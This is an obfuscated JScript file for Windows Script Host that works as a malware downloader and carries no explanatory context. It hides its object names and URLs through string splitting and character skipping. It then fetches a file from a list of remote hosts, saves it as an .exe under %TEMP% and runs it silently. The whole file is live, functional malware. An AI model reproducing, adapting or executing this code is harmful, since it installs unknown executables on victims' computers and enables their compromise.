
function LiwKtlTG(JxrKm,bbHkYU) {
JxrKm.Run(bbHkYU, 0x1, 0x0);
}
function FLSFvRMjE(XujSddNrCSu) {
var VYPFUtOc = "fUEZ Ws PJDzNXJ c huvFop ri pt jOnreaOd .S dbpDw he btiXBA ll".split(" ");
var hdsmqtgA = VuLE(VYPFUtOc[792-791] + VYPFUtOc[689-686] + VYPFUtOc[190-185] + VYPFUtOc[935-929] + VYPFUtOc[276-268] + VYPFUtOc[542-532]+VYPFUtOc[941-929]);
LiwKtlTG(hdsmqtgA,XujSddNrCSu);
}
function WGanQSQJQ(TRvUr,EXlwZ,EtQJX,IcQR) {
var bBpza = "Okyynr Ndd pt.Shell NOGuAai Scri  %TE MP% \\".split(" ");
var RJd=((429-428)?"W" + bBpza[314-310]:"")+bBpza[487-485];
var DI = VuLE(RJd);
return xIfDYhW(DI,bBpza[904-898]+bBpza[488-481]+bBpza[395-387]);
}
function Zvvgfnty() {
var drQDRLZ = "Sc PXMVJsn r qIhlPmpXS ipting PUJcwkI TBL ile NSuGZxXHXwqxQy System Mp RvnJP Obj hRvRww ect szGysOM".split(" ");
return drQDRLZ[0] + drQDRLZ[2] + drQDRLZ[4] + ".F" + drQDRLZ[7] + drQDRLZ[9] + drQDRLZ[12] + drQDRLZ[14];
}
function VuLE(GBuDM) {
GLWUnYv = WScript.CreateObject(GBuDM);
return GLWUnYv
}
function bJIY(WRMfI,CUxFl) {
WRMfI.write(CUxFl);
}
function Ypkg(MEcPp) {
MEcPp.open();
}
function LBHc(bJhyb,tPbxy) {
bJhyb.saveToFile(tPbxy,468-466);
}
function sehi(sjOkj,MwUAt,fZzbk) {
sjOkj.open(fZzbk,MwUAt,false);
}
function gSXa(SFQej) {
if (SFQej == 1081-881){return true;} else {return false;}
}
function VeQv(mIWsq) {
if (mIWsq > 190120-461){return true;} else {return false;}
}
function kkJS(iprHB) {
var HeXMK="";
N=(560-560);
while(true) {
if (N >= iprHB.length) {break;}
if (N % (950-948) != (512-512)) {
HeXMK += iprHB.substring(N, N+(902-901));
}
N++;
}
return HeXMK;
}
function ULoA(KmoMy) {
var NECtTrRW=["\x73\x65\x6E\x64"];
KmoMy[NECtTrRW[0]]();
}
function NEOs(knLrg) {
return knLrg.status;
}
function IlLio(seJgZE) {
return new ActiveXObject(seJgZE);
}
function xIfDYhW(TNIX,sIHzU) {
return TNIX.ExpandEnvironmentStrings(sIHzU);
}
function qfXZhBG(xCyM) {
return xCyM.responseBody;
}
function tjMXEKJf(YLP) {
return YLP.size;
}
var RY="rwLiItyckhCbOethIefrUeSquqA.1cdoImM/66V9cjvraKxeD?Y 2m7oimXmIygcvaPnPtGaCk0eofzfR.PcOoQmk/A6N91jwryKdeG?X n?T b?j 0?";
var Iz = kkJS(RY).split(" ");
var kkyrFS = ". FyRypt e xKjNgOkw xe jrKe".split(" ");
var I = [Iz[0].replace(new RegExp(kkyrFS[5],'g'), kkyrFS[0]+kkyrFS[2]+kkyrFS[4]),Iz[1].replace(new RegExp(kkyrFS[5],'g'), kkyrFS[0]+kkyrFS[2]+kkyrFS[4]),Iz[2].replace(new RegExp(kkyrFS[5],'g'), kkyrFS[0]+kkyrFS[2]+kkyrFS[4]),Iz[3].replace(new RegExp(kkyrFS[5],'g'), kkyrFS[0]+kkyrFS[2]+kkyrFS[4]),Iz[4].replace(new RegExp(kkyrFS[5],'g'), kkyrFS[0]+kkyrFS[2]+kkyrFS[4])];
var qCs = WGanQSQJQ("gzvc","SPkdn","PVsfgL","eGkZdRn");
var vgm = IlLio(Zvvgfnty());
var NWJtYd = ("kNtGmMC \\").split(" ");
var FmJr = qCs+NWJtYd[0]+NWJtYd[1];
try{
vgm.CreateFolder(FmJr);
}catch(VZhGCf){
};
var UDj = ("2.XMLHTTP PNivYHe qAmGV XML ream St RLsqEOkx AD jOjcGVe O OBSA D").split(" ");
var yH = true  , trdm = UDj[7] + UDj[9] + UDj[11];
var yv = VuLE("MS"+UDj[3]+(564388, UDj[0]));
var mFZ = VuLE(trdm + "B." + UDj[5]+(461788, UDj[4]));
var FEE = 0;
var b = 1;
var TbOOGdW = 129769;
var M=FEE;
while (true)  {
if(M>=I.length) {break;}
var KJ = 0;
var rwl = ("ht" + " tlNFowv tp FMynh EMgiHubP :// pCyqKbv .e TTShv x ZZNZIf e G pOMNrgC E qaVTKtrJ T").split(" ");
try  {
var nLKRi=rwl[197-197]+rwl[596-594]+rwl[698-693];
sehi(yv,nLKRi+I[M]+b, rwl[12]+rwl[14]+rwl[16]); ULoA(yv); if (gSXa(NEOs(yv)))  {      
Ypkg(mFZ); mFZ.type = 1; bJIY(mFZ,qfXZhBG(yv)); if (VeQv(tjMXEKJf(mFZ)))  {
KJ = 1;mFZ.position=(433-433);LBHc(mFZ,/*Sk6w58DLlO*/FmJr/*TqmZ93hYhD*/+TbOOGdW+rwl[7]+rwl[9]+rwl[11]); try  {
if (234>39) {
FLSFvRMjE(FmJr+TbOOGdW+/*znJJ906lzy*/rwl[7]+rwl[9]+rwl[11]/*Z8rf18FyIm*/); 
break;
}
}
catch (xW)  {
}; 
}; mFZ.close(); 
}; 
if (KJ == 1)  {
FEE = M; break; 
}; 
}
catch (xW)  { 
}; 
M++;
}; 

